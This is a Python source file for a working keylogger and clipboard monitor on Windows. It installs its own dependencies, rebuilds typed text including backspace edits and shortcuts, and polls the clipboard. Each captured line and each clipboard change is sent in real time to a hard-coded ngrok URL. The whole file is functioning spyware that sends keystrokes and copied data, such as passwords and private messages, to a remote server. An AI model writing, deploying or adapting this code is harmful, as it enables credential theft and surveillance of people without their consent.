import os
import subprocess
import sys

# 1. Define required dependencies
REQUIRED_PACKAGES = ["pynput", "pyperclip", "requests"]


def check_and_install_dependencies():
  missing_packages = []
  for package in REQUIRED_PACKAGES:
    try:
      __import__(package)
    except ImportError:
      missing_packages.append(package)

  if missing_packages:
    print(
        f"Missing dependencies detected: {', '.join(missing_packages)}. Installing..."
    )
    subprocess.check_call(
        [sys.executable, "-m", "pip", "install"] + missing_packages
    )
    print("Dependencies installed successfully. Restarting script...")
    os.execv(sys.executable, [sys.executable] + sys.argv)


check_and_install_dependencies()

import ctypes
import queue
import threading
import time
from pynput import keyboard
import pyperclip
import requests

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

NGROK_URL = "https://jaunt-happiness-tinsmith.ngrok-free.dev/log"
CLIPBOARD_URL = NGROK_URL.replace("/log", "/clipboard")

request_queue = queue.Queue()


def background_sender():
  """Sends logs and clipboard data straight to your server in real-time."""
  try:
    requests.post(
        NGROK_URL.replace("/log", "/start-session"),
        headers={"ngrok-skip-browser-warning": "true"},
        timeout=1,
    )
  except:
    pass

  while True:
    item = request_queue.get()
    if item is None:
      break
    msg_type, line_text = item
    target_url = CLIPBOARD_URL if msg_type == "clip" else NGROK_URL
    payload = {"log": line_text} if msg_type == "key" else {"text": line_text}

    try:
      requests.post(
          target_url,
          json=payload,
          headers={"ngrok-skip-browser-warning": "true"},
          timeout=0.5,
      )
    except requests.exceptions.RequestException:
      pass
    request_queue.task_done()


sender_thread = threading.Thread(target=background_sender, daemon=True)
sender_thread.start()


def clipboard_monitor():
  """Monitors clipboard changes and pushes raw copied text straight to the queue."""
  try:
    last_clipboard = pyperclip.paste()
  except Exception:
    last_clipboard = ""

  while True:
    try:
      current_clipboard = pyperclip.paste()
      if current_clipboard and current_clipboard != last_clipboard:
        last_clipboard = current_clipboard
        request_queue.put(("clip", current_clipboard))
    except Exception:
      pass
    time.sleep(1)


clip_thread = threading.Thread(target=clipboard_monitor, daemon=True)
clip_thread.start()

# Keep track of state
currently_pressed = set()
sentence_buffer = []
backspace_count = 0
new_text_buffer = []
modifier_lonely_state = {}
timer = None


def is_terminal_focused():
  """Checks if the currently active foreground window belongs to a terminal/console."""
  try:
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
    if length > 0:
      buff = ctypes.create_unicode_buffer(length + 1)
      ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
      window_title = buff.value.lower()

      terminal_identifiers = [
          "cmd.exe",
          "powershell",
          "terminal",
          "bash",
          "zsh",
          "python",
          "py",
          "windowspowershell",
          "command prompt",
      ]
      return any(term in window_title for term in terminal_identifiers)
  except Exception:
    pass
  return False


def get_key_name(key):
  """Maps keys and translates raw Windows virtual key codes into readable names."""
  if key == keyboard.Key.backspace:
    return "backspace"
  if key == keyboard.Key.space:
    return "space"
  if key == keyboard.Key.enter:
    return "enter"
  if key == keyboard.Key.esc:
    return "esc"

  try:
    if key.char is not None:
      char = key.char
      if ord(char) < 32:
        return chr(ord(char) + 96)
      return char
  except AttributeError:
    pass

  try:
    name = key.name
    if "ctrl" in name:
      return "ctrl"
    if "shift" in name:
      return "shift"
    if "alt" in name:
      return "alt"
    if "cmd" in name or "win" in name or "super" in name:
      return "win"
    return name
  except AttributeError:
    pass

  try:
    if hasattr(key, "vk") and key.vk is not None:
      vk = key.vk
      if 65 <= vk <= 90:
        return chr(vk).lower()
      if 48 <= vk <= 57:
        return chr(vk)
      if 96 <= vk <= 105:
        return f"num_{vk - 96}"
      return f"vk_{vk}"
  except AttributeError:
    pass

  return None


def log_and_send(line_text, is_raw=False):
  formatted_line = line_text if is_raw else f"key pressed: {line_text}"
  request_queue.put(("key", formatted_line))


def flush_sentence():
  global sentence_buffer, backspace_count, new_text_buffer
  if sentence_buffer:
    original_text = "".join(sentence_buffer)
    log_and_send(original_text, is_raw=False)

    if backspace_count > 0:
      pos = max(0, len(original_text) - backspace_count)
      new_text = "".join(new_text_buffer)
      combined_str = f"{' ' * len('key pressed: ')}{' ' * pos}{'↑' * backspace_count}{new_text}"
      log_and_send(combined_str, is_raw=True)

    sentence_buffer = []
    backspace_count = 0
    new_text_buffer = []


def reset_timer():
  global timer
  if timer:
    timer.cancel()
  timer = threading.Timer(0.7, flush_sentence)
  timer.start()


def on_press(key):
  global timer, sentence_buffer, backspace_count, new_text_buffer

  if key == keyboard.Key.esc and is_terminal_focused():
    print(
        "\nEscape pressed inside the terminal window. Stopping key and clipboard"
        " logger..."
    )
    if timer:
      timer.cancel()
    flush_sentence()
    return False

  key_name = get_key_name(key)
  if not key_name:
    return

  # If Ctrl is pressed, completely strip out any lingering non-modifier symbol artifacts (like '!') from tracking
  if "ctrl" in currently_pressed and not key_name.isalnum() and len(key_name) == 1:
    return

  if key_name in currently_pressed:
    return
  currently_pressed.add(key_name)

  has_ctrl_alt_win = any(
      m in currently_pressed for m in ["ctrl", "alt", "win"]
  )
  has_shift = "shift" in currently_pressed
  is_modifier = key_name in ["ctrl", "shift", "alt", "win"]

  if is_modifier:
    modifier_lonely_state[key_name] = True

  is_true_shortcut = False
  if has_ctrl_alt_win and not is_modifier:
    is_true_shortcut = True
  elif has_shift and not is_modifier:
    if len(key_name) != 1:
      is_true_shortcut = True

  if is_true_shortcut:
    if timer:
      timer.cancel()
    flush_sentence()
    for m in currently_pressed:
      if m in modifier_lonely_state:
        modifier_lonely_state[m] = False
    
    # Filter out any accidental symbols or uppercase letters from shortcut reporting
    clean_shortcut_keys = [
        k for k in currently_pressed if k.isalnum() or k in ["ctrl", "shift", "alt", "win"]
    ]
    sorted_keys = sorted(
        list(clean_shortcut_keys),
        key=lambda x: (
            0 if x in ["ctrl", "shift", "alt", "win"] else 1,
            x.lower(),
        ),
    )
    shortcut_string = " + ".join(sorted_keys)
    log_and_send(shortcut_string, is_raw=False)
    return

  if key_name == "backspace":
    if timer:
      timer.cancel()
    if sentence_buffer:
      if len(new_text_buffer) > 0:
        new_text_buffer.pop()
      elif backspace_count < len(sentence_buffer):
        backspace_count += 1
    reset_timer()
  elif not is_modifier:
    if len(key_name) == 1 or key_name == "space":
      for m in currently_pressed:
        if m in modifier_lonely_state:
          modifier_lonely_state[m] = False
      char_to_add = " " if key_name == "space" else key_name
      if backspace_count > 0:
        new_text_buffer.append(char_to_add)
      else:
        sentence_buffer.append(char_to_add)
      reset_timer()
    else:
      if timer:
        timer.cancel()
      flush_sentence()
      log_and_send(key_name, is_raw=False)


def on_release(key):
  global timer
  key_name = get_key_name(key)
  if not key_name:
    return

  if key_name in ["ctrl", "shift", "alt", "win"]:
    if modifier_lonely_state.get(key_name, False):
      if timer:
        timer.cancel()
      flush_sentence()
      log_and_send(key_name, is_raw=False)
    if key_name in modifier_lonely_state:
      del modifier_lonely_state[key_name]

  try:
    currently_pressed.remove(key_name)
  except KeyError:
    pass


print(
    "Key and Clipboard logger is running... Press ESC inside the terminal window"
    " to stop cleanly."
)
with keyboard.Listener(
    on_press=on_press, on_release=on_release
) as listener:
  listener.join()